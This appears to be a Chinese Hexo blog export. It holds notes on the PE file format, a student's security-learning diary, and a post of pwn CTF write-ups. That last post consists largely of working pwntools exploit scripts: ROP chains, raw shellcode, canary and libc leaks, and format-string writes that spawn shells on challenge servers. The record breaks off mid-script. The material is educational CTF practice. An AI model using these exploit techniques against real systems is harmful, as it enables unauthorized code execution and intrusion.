    <content><![CDATA[<h1 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h1><p>可执行文件的格式是操作系统本身执行机制的反映。<br>PE（Portable Executable File Format 可移植的执行体)<br>头文件winnt.h中的image format给出了pe文件的内容，可以找到所有pe文件的数据结构定义、枚举类型、常量定义等<br>exe和dll文件使用完全相同的pe格式，唯一的区别就是用一个字段标识出这个文件是exe还是dll<br>64位Windows只是对pe格式进行了一些简单的修饰，新的格式为pe32+，没有新的结构加入，只是把32位字段扩展成64位<br><img src="https://s1.ax1x.com/2020/05/25/tCceGn.png" alt="tCceGn.png"><br><a id="more"></a></p>
<h2 id="PE的基本概念"><a href="#PE的基本概念" class="headerlink" title="PE的基本概念"></a>PE的基本概念</h2><p>pe文件的内容分为不同区块，区块中包含代码或数据，各个区块按页边界对齐。区块大小没有限制，是一个连续的结构。每个块在内存中都有自己的属性如是否包含代码、是否可读写等<br>pe文件不是作为单一内存映射文件被载入内存。pe装载器遍历pe文件并决定文件的哪部分被映射。磁盘文件一旦被载入内存，磁盘上的数据结构布局和内存中的数据结构布局就是一致的，但数据之间的的相对位置可能会改变</p>
<h3 id="基地址"><a href="#基地址" class="headerlink" title="基地址"></a>基地址</h3><p>PE文件通过加载器载入内存后，内存中的版本称为模块。映射文件的起始地址（基地址）称为模块句柄，可以通过模块句柄访问内存中的其他数据结构。<br><img src="https://s1.ax1x.com/2020/05/25/tCcm2q.png" alt="tCcm2q.png"><br>内存中的模块代表进程将这个可执行文件所需要的代码、数据、输入表、输出表及其他有用的数据结构所使用的内存都放在一个连续的内存块中。PE文件的剩余部分可以被读入，但可能无法被映射。例如在将调试信息放到文件尾部时，PE的一个字段会告诉系统不能映射的数据将被放置在文件的尾部。在32位Windows种可以直接调用GetModuleHandle取得指向dll的指针，通过该指针访问DLL Mdodle。<br>基地址的值是由pe文件本身设定的</p>
<h2 id="虚拟地址（Virtual-Address）"><a href="#虚拟地址（Virtual-Address）" class="headerlink" title="虚拟地址（Virtual Address）"></a>虚拟地址（Virtual Address）</h2><h3 id="相对虚拟地址（RVA）"><a href="#相对虚拟地址（RVA）" class="headerlink" title="相对虚拟地址（RVA）"></a>相对虚拟地址（RVA）</h3><p>相对于pe文件载入地址的偏移位置，其实就是一个偏移量。<br>假设一个文件从400000h处载入，代码区块开始于401000h处，代码区块的RVA计算方法：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">目标地址401000-载入地址400000h&#x3D;RVA1000h</span><br></pre></td></tr></table></figure><br>同样，<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">虚拟地址VA&#x3D;基地址ImageBase+相对虚拟地址RVA</span><br></pre></td></tr></table></figure></p>
<h3 id="文件偏移地址（物理地址）"><a href="#文件偏移地址（物理地址）" class="headerlink" title="文件偏移地址（物理地址）"></a>文件偏移地址（物理地址）</h3><p>pe文件的某个数据位置相对于文件头的偏移量<br>用十六进制工具打开文件时显示的地址就是文件偏移地址</p>
]]></content>
      <tags>
        <tag>加密与解密</tag>
        <tag>CTF</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>不定期日记</title>
    <url>/39190.html</url>
    <content><![CDATA[<p>…<br><a id="more"></a><br>感觉2020-10-28以前写的都…emmm好乱好蠢（…</p>
<p>鸽了一个月才开始写….</p>
<h3 id="2020-11-28"><a href="#2020-11-28" class="headerlink" title="2020-11-28"></a>2020-11-28</h3><p>在新电脑上配好了github pages+hexo，主要是安装nodejs、git、hexo，然后连接github上的账户</p>
<p>然后deploy的时候发现报错：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TypeError [ERR_INVALID_ARG_TYPE]: The &quot;mode&quot; argument must be integer. Received an instance of Objec</span><br></pre></td></tr></table></figure><br>查了之后发现可能是nodejs版本太高了…<br>不整了，先学习</p>
<p>一个多月前开始想学iot_sec。上周找学习路线和资料，并开始尝试arm汇编，结果qemu的环境都整不出来。期间和几位大师傅聊了一下，决定还是先学二进制，把方法论先掌握了。</p>
<p>开始学heap。</p>
<h3 id="2020-12-3"><a href="#2020-12-3" class="headerlink" title="2020-12-3"></a>2020-12-3</h3><p>这两天写了四题攻防世界的进阶题。一题堆，三题栈，其中一题发了个wp在攻防世界上。前两题还行，后面两题都卡在了莫名其妙的地方，解决了之后还是不是特别理解，但大抵都是pwntools使用上的问题，花太多时间纠结在这方面感觉有点浪费时间，但还是有些收获的。<br>再看一点pwn题、ctfwiki、逆向技术之后，应该可以开始realworld的漏洞了。最近不知道为啥挺焦虑的，可能是因为学长要去绿盟or科恩实习&amp;上次交流的科恩大哥也说明年可以去投几个实验室实习？（但我要考研的话应该不急着实习吧…)。写着写着突然觉得是不是因为酸web安全和前端后端他们了，前一阵子想转iot估计也是因为没有太多正向激励？<br>好好学习！</p>
<h3 id="2020-12-17"><a href="#2020-12-17" class="headerlink" title="2020-12-17"></a>2020-12-17</h3><p>快要期末考了，最近有点不知道想干啥…想复习（预习？）但是提不起劲，要学pwn但是总觉得该复习了，另外，为啥期末的时候倒是来了几个ctf比赛orzzz<br>这两天又看了一点点iot的东西，可能是因为又被堆漏洞折磨了。不过不论是系统（固件）or软件，漏洞总归是堆、栈（可能还有池？但还没接触过）之类那么几种（不知道在其他cpu架构下有没有别的，或者是受限于冯诺依曼机），不如先从常规的二进制安全入手学习。<br>这两周写了几个stack的pwn题，胡乱看了一点malloc源码，可以再接触一点pwn-heap题了。</p>
<h3 id="2021-01-19"><a href="#2021-01-19" class="headerlink" title="2021-01-19"></a>2021-01-19</h3><p>放假两周了。<br>回家后复习了x86汇编实模式的后三章，又看完保护模式的前四章。<br>感觉x86讲的东西挺好的，但有时候好绕？<br>看目录觉得后面讲的基本都有接触过一些，这周就先转去看操作系统了，毕竟放假看x86的目的就是学操作系统，而《操作系统精髓与设计原理》 这本似乎就只是在讲概念，也没有涉及到代码，问题应该不大。看了四天，看到第三章   </p>
<p>因为昨天报了几个ctf<br>今天的话，复习了一下堆的一些基础知识。<br>学习上又开始没动力了…</p>
<p>最近要练科三了（3号考），学习的时间再次减少。拿了本经济学原理（微观），希望能在去练车场的路上看看…<br>不知道啥时候能开始坚持写日报，希望至少在考完科三后开始。</p>
<h3 id="2021-02-26"><a href="#2021-02-26" class="headerlink" title="2021-02-26"></a>2021-02-26</h3><p>懂了，这是月记。<br>今天返校了。这个寒假拿了个驾照，在市区&amp;县城开了几趟，以及开了一趟高速；看了五六章x86汇编，然后跳到《操作系统精髓与设计原理》懂了一点内核、进程 线程、分页 分段、虚拟内存的概念，并由于知识量大 尝试每看三章就对每章做一次总结；看了一章《0day2》，进度到了堆漏洞的章节，然后再看了其他的资料了解ptmalloc分配和释放内存的步骤。<br>党哥前几天说回学校之后要给我个考核，这两天复习了一点汇编和PE文件结构。<br>每次回家感觉都会产生一些别的想法（？）。这次的话主要是：</p>
<ol>
<li>对考研的目的有更深的理解。讲真有时候挺佩服我爸的学习能力和信息搜集能力的，能够很快理解某个陌生行业/知识的体系和框架（尤其是他对安全领域的理解），以及一些其他硕士出身的长辈，这种“检索理解归纳新领域信息”的能力似乎就是研究生所需要学会的。另外，考研也是一个掌握牢本科几门课程的机会，罔论专业课，我似乎快感受到数学的重要性了…</li>
<li>关于以后从事什么职业以及在什么城市。之前总觉得去个腾讯、绿盟亦或360之类的公司挖漏洞挺好的，只有去不了大公司的情况下才会选择进体制内。没想到某天晚上跟我妈聊天，问她了个“100w年薪的企业or20w公务员”的问题，她回答觉得公务员比较好，我把企业的年薪提到200w，她还是觉得公务员好…。不由得让我想对职业选择再仔细考虑一下。<br>我觉得在哪个城市也挺关键的。如果在厦门，安全类的公司除了美亚柏科和另外一个做区块链安全的公司外好像也没有了orz，如果在北京或深圳，我似乎也没资格进体制内。之前挺想在北京或深圳的，过了一个假期不知道为啥感觉在厦门居住也太舒服了（部分原因可能是跟着我爸妈去翔安吃了顿饭、在同安度假泡了个温泉），仔细想来概因是能直接享受到父母和亲戚打拼下的成果，包括人脉（which我现在意识到非常重要了）和车、房，我妈还能帮我介绍对象（…）并且在爸妈老了之后可以很方便的照顾他们。前两个原因是否也算一种变相啃老呢orz，但或许这一代的家庭就应该是在一个城市扎根，而不像父辈那样在一个新的城市从零开始。</li>
</ol>
<h3 id="2021-03-01"><a href="#2021-03-01" class="headerlink" title="2021-03-01"></a>2021-03-01</h3><p>其实党哥根本没有准备给我考试…<br>开学的第一天，复习了一下堆分配和释放的过程，整理了一波笔记<br>上了个微机原理和数据库，感觉算是对目前安全的学习都有直接用处，特别是微机原理，把8086和其他cpu的汇编语言和硬件结合，应该能更好的加强理解，数据库的话， sql语法主要是对于web安全了。<br>感觉有点酸web安全，hw实习的工资好高…<br>今天的话，还看了个经济学人的文章，做了笔记，结果wps国际版要vip才能保存…附加到od里，结果直接 pdf的窗口直接结束运行了…于是下了个foxin</p>
<h3 id="2021-03-03"><a href="#2021-03-03" class="headerlink" title="2021-03-03"></a>2021-03-03</h3><p>主要看完了0day2的堆漏洞章节，还看了ctf-wiki上的堆溢出和off by one，感觉后者的题很难理解…<br>这两天发现新版Edge看pdf变得很舒服了，再看了一篇经济学人的文章。</p>
<h3 id="2021-03-06"><a href="#2021-03-06" class="headerlink" title="2021-03-06"></a>2021-03-06</h3><p>在知乎上发现@ScUpax0s师傅原来也是大二的，学的进度可能将近比我快了一年，还是看雪的版主…跟党哥进了同一家公司（星阑）实习。本来还打算追随党哥也投个星阑远程（划水），结果发现自己可能过于菜…<br>但还是在党哥的监督下写了个简短的简历，发现自己大一的时候啥都不想争取，没有奖学金也没有奖项，简历真是太空了orz。投了一家成都做CTF培训之类的的真·小公司，不知道会咋样orz。<br>关于@ScUpax0s师傅这个，看了他的博客，发现我现在学的 差不多是他去年五月份在做的…但讲真论学习的速度应该是差不多的，所以又在想是不是我在学pwn的时候走了啥弯路。（写到这个的时候想起来去年看了TK的某条关于走弯路的微博，心态又好了些）<br>但回想起来感觉自己的学习路线还是出现了一点弯弯，就 不算是特别直接的向着漏洞挖掘方向学习</p>
<h3 id="2021-03-07"><a href="#2021-03-07" class="headerlink" title="2021-03-07"></a>2021-03-07</h3><p>看了两天的off-by-one题(b00k)，想起来看别人题解看不懂的时候可以跟着一段段模仿exp抑或是用纸和笔画内存数据的变化情况，然后边调试边弄懂每段代码的功能和效果以及怎么想出的wp。本来这种做法在学栈方面的漏洞时经常用到，特别是上回弄栈迁移的时候，可能是才刚开始做堆漏洞的题吧…浪费了半天的时间死磕别人的题解和exp。<br>b00k剩下最后一点没有看完，感觉这种题放在初学还是有点难度…做了一个hitcon_lab13，感觉对接受数据（recv()之类）的过程，以及啥时候要转换（u64、u32）还是不是很明白<br>晚上在实验室看了部《美国丽人》</p>
<h3 id="2021-03-08"><a href="#2021-03-08" class="headerlink" title="2021-03-08"></a>2021-03-08</h3><p>补了两天的日报（↑），更早之前的记不清了orzz<br>今天用linux写exp的时候，因为有时候习惯按ctrl+z，虚拟机直接卡爆，一ps看 有几十个python脚本运行着…上网查了一下结束同名进程的方法：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -ef | grep 'python' | grep -v grep | awk '&#123;print $2&#125;' | xargs kill -9</span><br></pre></td></tr></table></figure><br>感觉shell语法挺值得学的，打算啥时候开始学一学（咕咕咕）<br>晚上隔壁实验室有个学长的服务器2080ti被黑去挖矿，于是跟着web安全的两个人过去瞅了瞅，还让大三实习的学长连了向日葵操作一波。还好用过linux，能看懂他们在干啥…收获了个应急响应的github教程，感觉好有趣（orz   </p>
<h3 id="2021-03-09"><a href="#2021-03-09" class="headerlink" title="2021-03-09"></a>2021-03-09</h3><p>写了一个heapcreator_wp。<br>晚上遇到0x2l师傅，打算近期开始跟着mit6.828做操作系统，然后好好学计组。<br>跟021w师傅和WalkerRev师傅聊了几句，他们又要面试了. TQL呜呜呜    </p>
<h3 id="2021-03-11"><a href="#2021-03-11" class="headerlink" title="2021-03-11"></a>2021-03-11</h3><p>这几天其实好像都没干啥…在磕fastbin_attack，有时候感觉略微迷茫<br>晚上看了021w师傅投的腾讯游戏安全部门的“技术面”，结果一开始面试官聊天的时候发现其实方向不太对orz，师傅搞内核漏洞的，结果部门是偏向逆向、开发和游戏漏洞，所以面试就变成近半个小时的聊天…其中面试官也讲了好多，感觉确实windows内核漏洞这个方向太窄了，对于我这种菜鸡来说也不是特别promising（虽然我对内核漏洞好像也不是特别感兴趣<br>感觉漏洞的方向其实挺多，需要的知识也挺杂的，例如游戏安全需要分析、构造数据包…<br>那位面试官也说了逆向技能和正向开发能力的重要性，以及最终职业和兴趣的关系，果然不是大牛的话就只能为生活所迫了     </p>
<h3 id="2021-03-13"><a href="#2021-03-13" class="headerlink" title="2021-03-13"></a>2021-03-13</h3><p>昨天啥都没干，写作业去了，<br>周六（今天）放了个假，晚上补了11号的日报（↑）<br>最近主要是学习计组，可能是因为对方向上的学习顺序不是很清楚吧orzz<br>现在有：1.操作系统（理论）2.操作系统（mit6.828） 3.pwn-heap 4.0day2 5.c++ 6.iot（比如arm汇编啥的）要学    </p>
<p>明天该上班了，问问0x2l师傅</p>
<h3 id="2021-03-14"><a href="#2021-03-14" class="headerlink" title="2021-03-14"></a>2021-03-14</h3><p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315101624.png" alt="20210315101624"><br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315101325.png" alt="20210315101325">    </p>
<p>大概有个学习顺序了<br>今天又是肝作业的一天</p>
]]></content>
      <tags>
        <tag>日报</tag>
      </tags>
  </entry>
  <entry>
    <title>部分pwn题wp</title>
    <url>/26411.html</url>
    <content><![CDATA[<p>主要是大二上刚开学做的题<br><a id="more"></a></p>
<h1 id="2020moectf部分pwn"><a href="#2020moectf部分pwn" class="headerlink" title="2020moectf部分pwn"></a>2020moectf部分pwn</h1><h2 id="rop1"><a href="#rop1" class="headerlink" title="rop1"></a>rop1</h2><p>wp:<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./rop1'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x400670</span></span><br><span class="line">binsh = <span class="number">0x00601070</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">'a'</span>*<span class="number">136</span> + p64(<span class="number">0x0400933</span>) + p64(binsh) + p64(sys) </span><br><span class="line"><span class="comment">#400933为‘pop rdi,ret’</span></span><br><span class="line">sh.sendline(p)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><br><!--more--><br>需要注意到，这题是x64的，跟x86的做法（ctfwiki-basicROP-ret2libc1）有些不同。<br>x64调用函数传递参数时先使用rdi、rsi、rdx、rcx、r8、r9（储存整数和指针）等，再用栈</p>
<h2 id="rop2"><a href="#rop2" class="headerlink" title="rop2"></a>rop2</h2><p>wp:<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./rop2'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x0400670</span></span><br><span class="line">gets = <span class="number">0x04006b0</span></span><br><span class="line">pop_rdi = <span class="number">0x0400933</span></span><br><span class="line">bss = <span class="number">0x006010A8</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">'a'</span>*<span class="number">136</span> + p64(pop_rdi) + p64(bss) + p64(gets) + p64(pop_rdi) + p64(bss) + p64(sys)</span><br><span class="line"></span><br><span class="line">sh.sendline(p)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
<p>卡在少了最开始的p64(pop_rdi) + p64(bss) </p>
<p>学长的解释是：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">改变rdi的gadget地址 使其指向bss段的那个地址</span><br></pre></td></tr></table></figure></p>
<h2 id="unusual"><a href="#unusual" class="headerlink" title="unusual"></a>unusual</h2><p>用alpha3弄出一个Alphanumeric Shellcode</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line"><span class="keyword">print</span> asm(sc)</span><br><span class="line"><span class="comment">#sc.py</span></span><br><span class="line"></span><br><span class="line">python sc.py &gt; sc</span><br><span class="line"></span><br><span class="line">python alpha3/ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">"sc"</span></span><br></pre></td></tr></table></figure>
<h2 id="hard-shelcode"><a href="#hard-shelcode" class="headerlink" title="hard_shelcode"></a>hard_shelcode</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">sh = process(<span class="string">"./hard_shellcode"</span>)</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">sub_rsp = asm(<span class="string">'sub rsp, 64'</span>)</span><br><span class="line">jmp_rsp = asm(<span class="string">'jmp rsp'</span>)</span><br><span class="line">gadget = <span class="number">0x04000EA</span></span><br><span class="line"></span><br><span class="line">payload = sc + <span class="string">'a'</span>*(<span class="number">64</span>-len(sc)) + sub_rsp + jmp_rsp + <span class="string">'b'</span>*(<span class="number">8</span>-len(sub_rsp)-len(jmp_rsp)) + gadget</span><br><span class="line"><span class="comment">#payload = 'a'*16 + sc + sub_rsp + jmp_rsp + 'b'*(8-len(sub_rsp)-len(jmp_rsp)) + p64(gadget) </span></span><br><span class="line"><span class="comment">## sub rsp,48</span></span><br><span class="line"> </span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>用gadget跳转到”sub_rsp,jmp_rsp”然后执行sc(shellcode)</p>
<h2 id="baby-migration"><a href="#baby-migration" class="headerlink" title="baby_migration"></a>baby_migration</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line">p = process(<span class="string">"./baby_migration"</span>)</span><br><span class="line"></span><br><span class="line">gets = <span class="number">0x4011C8</span></span><br><span class="line">rbp = <span class="number">0x404060</span></span><br><span class="line"><span class="comment">#shell = asm(shellcraft.sh())</span></span><br><span class="line">shell = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"a"</span>*<span class="number">0x30</span> + p64(rbp+<span class="number">300</span>) + p64(gets) </span><br><span class="line">payload2 = shell + <span class="string">'b'</span>*(<span class="number">0x30</span>-len(shell)) + p64(rbp ) + p64(rbp+<span class="number">300</span><span class="number">-0x30</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv()</span><br><span class="line">sleep(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><a href="https://bbs.pediy.com/thread-258030.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-258030.htm</a></p>
<p><a href="https://blog.csdn.net/yuanyunfeng3/article/details/51456049" target="_blank" rel="noopener">https://blog.csdn.net/yuanyunfeng3/article/details/51456049</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">栈迁移 的核心思想就是 将栈 的 esp 和 ebp 转移到一个 输入不受长度限制的 且可控制 的 址处，通常是 bss 段地址！ 在最后 ret 的时候 如果我们能够控制得 了 栈顶 esp指向的地址 就想到于 控制了 程序执行流！</span><br></pre></td></tr></table></figure></p>
<p>用pwntolls生成的shellcode执行不了，可能是因为太长？</p>
<h2 id="baby-canary"><a href="#baby-canary" class="headerlink" title="baby_canary"></a>baby_canary</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./baby_canary")</span></span><br><span class="line">p = remote(<span class="string">'sec.arttnba3.cn'</span>,<span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./baby_canary"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/home/pluto/Desktop/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">start = elf.symbols[<span class="string">'_start'</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x41</span></span><br><span class="line">p.send(payload1)	<span class="comment">#dont use sendline</span></span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line"></span><br><span class="line">canary = u32(<span class="string">'\x00'</span>+p.recv(<span class="number">3</span>))</span><br><span class="line">p.recv()</span><br><span class="line">payload2 = <span class="string">'b'</span>*<span class="number">0x40</span> + p32(canary) + <span class="string">'b'</span>*<span class="number">8</span> + <span class="string">'a'</span>*<span class="number">4</span> + p32(puts_plt) + p32(start) + p32(puts_got)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">"flag!\n"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">base_addr = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">sys_addr = base_addr + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh = base_addr + libc.search(<span class="string">'/bin/sh'</span>).next()	</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">payload3 = <span class="string">'b'</span>*<span class="number">0x40</span> + p32(canary) + <span class="string">'b'</span>*<span class="number">0xc</span> + p32(sys_addr) + <span class="string">'a'</span>*<span class="number">4</span> + p32(binsh)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>在覆盖’\x00’得到canary时不能用sendline</p>
<p>这题在本地弄不出来，在远程上就可以。发现是用的libc不一样，本机为libc6-i386_2.21-0ubuntu4_amd64，服务器上是libc6-i386_2.23-0ubuntu11.2_amd64</p>
<h1 id="ctfwiki"><a href="#ctfwiki" class="headerlink" title="ctfwiki"></a>ctfwiki</h1><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">stack = <span class="string">'a'</span>*<span class="number">112</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">main_plt = elf.symbols[<span class="string">"_start"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload1 = stack + p32(puts_plt) + p32(main_plt) + p32(puts_got)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">recv1 = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">print(<span class="string">"puts.got_addr= "</span>,hex(recv1))</span><br><span class="line"><span class="comment">#puts.got = cb0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">puts_offset = <span class="number">0x05fcb0</span></span><br><span class="line">sys_offset = <span class="number">0x03adb0</span></span><br><span class="line">binsh_offset = <span class="number">0x15bb0b</span> </span><br><span class="line"></span><br><span class="line">libc_base = recv1 - puts_offset</span><br><span class="line">sys_addr = libc_base + sys_offset</span><br><span class="line">binsh = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">payload2 = stack + p32(sys_addr) + <span class="string">'b'</span>*<span class="number">4</span> + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>libc 对应的是libc6_2.23-0ubuntu11.2_i386，对此是完全没想到的…</p>
<p>讲的挺好的<a href="https://www.jianshu.com/p/83f55c55c173" target="_blank" rel="noopener">https://www.jianshu.com/p/83f55c55c173</a></p>
<h1 id="XCTF进阶"><a href="#XCTF进阶" class="headerlink" title="XCTF进阶"></a>XCTF进阶</h1><h2 id="实时数据监测"><a href="#实时数据监测" class="headerlink" title="实时数据监测"></a>实时数据监测</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line">p = remote(<span class="string">"220.249.52.133"</span>, <span class="number">35866</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span><span class="params">(prev, word, index)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">"%"</span> + str(result) + <span class="string">"c"</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">"%"</span> + str(result) + <span class="string">"c"</span></span><br><span class="line">    fmtstr += <span class="string">"%"</span> + str(index) + <span class="string">"$hhn"</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span><span class="params">(offset, size, addr, target)</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = len(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">payload = fmt_str(<span class="number">12</span>,<span class="number">4</span>,<span class="number">0x0804a048</span>,<span class="number">0x02223322</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><a href="https://www.dazhuanlan.com/2019/11/07/5dc3d67635dfe/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/11/07/5dc3d67635dfe/</a></p>
<p>用ctfwiki提供的脚本比较快，自己试挺麻烦的…（还是不太熟练</p>
<h2 id="welpwn"><a href="#welpwn" class="headerlink" title="welpwn"></a>welpwn</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#p = process("./8")</span></span><br><span class="line">p = remote(<span class="string">"220.249.52.133"</span>, <span class="number">32410</span>)</span><br><span class="line">elf = ELF(<span class="string">"./8"</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc6_2.23-0ubuntu10_amd64</span></span><br><span class="line">sys_off = <span class="number">0x045390</span></span><br><span class="line">write_off = <span class="number">0x0f72b0</span></span><br><span class="line">binsh_off = <span class="number">0x18cd57</span></span><br><span class="line"></span><br><span class="line">pop = <span class="number">0x40089c</span></span><br><span class="line">pop_rdi = <span class="number">0x04008a3</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x18</span> + p64(pop) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(<span class="number">0x4007CD</span>)</span><br><span class="line"><span class="comment">#0x18+pop(8个字节)用于复制（下一个函数）后填充第二个栈到返回地址，然后将write的got表pop到rdi，用puts输出，返回到main函数的开头，设置环境</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_addr = p.recvuntil("\\")</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"\x40"</span>)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\00'</span>))</span><br><span class="line">write_addr = int(write_addr)</span><br><span class="line"><span 